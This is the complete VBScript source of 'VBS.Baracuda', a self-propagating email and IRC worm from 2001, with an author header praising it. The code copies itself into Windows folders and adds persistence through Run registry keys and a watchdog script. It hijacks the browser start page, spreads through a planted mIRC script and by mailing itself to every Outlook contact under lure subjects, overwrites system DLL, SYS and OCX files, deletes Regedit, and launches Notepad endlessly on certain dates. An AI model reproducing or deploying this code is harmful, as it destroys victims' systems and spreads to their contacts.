'	**************
'        VBS.Baracuda
' 	 By Dr.T/BCVG
'
'Very good virus I have to say.. first it starts with a simple random number generator to chose what will be
'the subject and the body of the sent email... after that it copies itself to [WinDir]\MSLogNet.vbs and 
'[WinDir]\Command\Energy.vbs after this it creates new file in [WinDir]\SearchMSN.vbs that will keep the
'MSNetLog.vbs "alive". After this it changes and adds some registry values. After that it going to 
'search for MIRC and after MIRC comes Outlook, after it will finish with MIRC and Outlook it 
'will infect all sys, dll ,ocx files in [WinDir]\[WinSYs] folder. Then displays a message
'and check for the date, if the date is 2,10,20,28 it will run Notepad "forever" until
'the system won't crach.
'VBS.Baracuda, Dr.T/BCVG, www.bcvgvx.cjb.net or mirro www.shadowvx.com/bcvg, finished at 24/02/01

Dim MPath
On Error Resume Next
Randomize
Sn = Int((6 * Rnd) +1)
if sn=1 then 
vxs = "Surprise"  
vxb = "A nice surprise for you, check it out..." 
end if
if sn=2 then 
vxs = "Great..."  
vxb = "Great app, check it out.."
end if
if sn=3 then 
vxs = "Important, Please Read" 
vxb = "A paper I downloaded from Symantec about new virus, you should read it"
end if
if sn=4 then 
vxs = "Happy Birthday"  
vxb = "A happy birthday surprise"
end if
if sn=5 then 
vxs = "Take a look..."  
vxb = "Take a look and the app that chenge to a pic"
end if
if sn=6 then 
vxs = "Great Joke.. Read it" 
vxb = "Read this joke, it is so great... ha ha"
end if

Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile(WScript.ScriptFullName,1)
mecopy = file.ReadAll

Set Windir = fso.GetSpecialFolder(0)
Set Sysdir = fso.GetSpecialFolder(1)
Set cf = fso.GetFile(WScript.ScriptFullName)

	cf.Copy(windir &"\MSNetLog.vbs")
	cf.Copy(windir &"\Command\Energy.vbs")

Set newf = fso.CreateTextFile(windir &"\SearchMSN.vbs", True)
	newf.Writeline("On Error Resume Next")
	newf.Writeline("Set fso = CreateObject(""Scripting.FileSystemObject"")")
	newf.Writeline("Set Energy = fso.OpenTextFile(""C:\Windows\Command\Energy.vbs"",1)")
	newf.Writeline("Code = Energy.ReadAll")
	newf.Writeline("Energy.Close")
	newf.Writeline("Do")
	newf.Writeline("If Not (fso.FileExists(""C:\Windows\MSNetLog.vbs"")) Then")
	newf.Writeline("Set Energy = fso.CreateTextFile(""C:\Windows\MSNetLog.vbs"", True)")
	newf.Writeline("Energy.Write Code")
	newf.Writeline("Energy.Close")
	newf.Writeline("End If")
	newf.Writeline("Loop")
	newf.Close
Set vxreg = CreateObject("WScript.Shell")
	vxreg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\SearchMSN", windir &"\SearchMSN.vbs"
	vxreg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSNetLog", windir &"\MSNetLog.vbs"
	vxreg.RegWrite "HKEY_CURRENT_USER\Microsoft\Internet Explorer\Main\Start Page", "http://vx.dirtyhosting.com"

Set ws = CreateObject("WScript.Shell")
	MPath = ""
	If MPath = "" Then
	If fso.FileExists("C:\Mirc\Mirc.ini") Then MPath = "C:\mirc"
	If fso.FileExists("C:\Mirc32\mirc.ini") Then MPath = "C:\mirc32"
	FDir = ws.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
	If fso.FileExists(FDir & "\mirc\mirc.ini") Then MPath = FDir & "\mirc"
	End If
	If MPath <> "" Then
	Set SF = fso.CreateTextFile(MPath & "\script.ini", True)
	SF.Writeline "[script]"
	SF.Writeline ";MIRC Script By Ahamad Boby"
	SF.Writeline "n0=on 1:JOIN:#:{"
	SF.Writeline "n1=  /if ( $nick == $me ) { halt }"
	SF.Writeline "n2=  /.dcc send $nick "&windir&"\Command\Energy.vbs"
	SF.Writeline "n3=}"
	SF.Close
	End If

Set vxout = WScript.CreateObject("Outlook.Application")
Set vxm = vxout.GetNameSpace("MAPI")

	For i = 1 To vxm.AddressLists.Count
		Set ma = vxm.AddressLists(i)
		j = 1
		regre = ws.RegRead("HKEY_LOCAL_MACHINE\Software\Microsof\WAB" & ma)
		If (regre = "") Then
			regre = 1
		End If
     		If (int(ma.AddressEntries.Count) > int(regre)) Then
			For vxen = 1 to ma.AddressEntries.Count
			mailed = ma.AddressEntries(j)
			k = ""
			k = ws.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB" & mailed)
			if (k="") then
				Set mail = vxout.CreateItem(0)
				mail.Recipients.Add(mailed)
				mail.Subject = vxs
				mail.Body = vxb
				mail.Attachments.Add(windir & "\Command\Energy.vbs")
				mail.Send
				ws.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" &mailed,1,"REG_DWORD"
			End If
			x = x +1 
			next
			ws.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&ma,ma.AddressEntries.Count
		Else
			ws.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&ma,ma.AddressEntries.Count
		End If
	Next
	Set vxout = Nothing
	Set vxm = Nothing
			

Set folderi = fso.GetFolder(Sysdir)
Set fid = folderi.Files
	For each file1 in fid
		ext = fso.GetExtensionName(file1.path)
		ext = lcase(ext)
		filen = lcase(file1.name)
		if (ext="sys") or (ext="dll") or (ext="ocx") Then
			Set fileen = fso.OpenTextFile(file1.path,2,true)
			fileen.Write mecopy
			fileen.Close
				
		end if
	next
msgbox "Hello" & chr(13) & "I want to tell you something about this program," & chr(13) & "At Friday aftrenoon I was sitting in my room and" & chr(13) & "think about new virii to write I didn't want to write" & chr(13) & "something big so i decided to build a VBS virus" & chr(13) & "and guess what... you were infected by it because" & chr(13) & "you are reading the message that it should displayed." & chr(13) & "The virus name is VBS.Baracuda" & chr(13) & "I don't why did I chose this name but anyway your" & chr(13) & "computer is dead !" & chr(13) & "Thank you" & chr(13) & "for being infected" & chr(13) & "Dr.T/BCVG", 16, "~~ VBS.Baracuda ~~"	

fso.DeleteFile(windir & "\Regedit.exe")
if Day(Now) = 2 or Day(Now) = 10 or Day(Now) = 20 or Day(Now) = 28 Then
	Do
	ws.run "notepad", false		
	loop
end if


	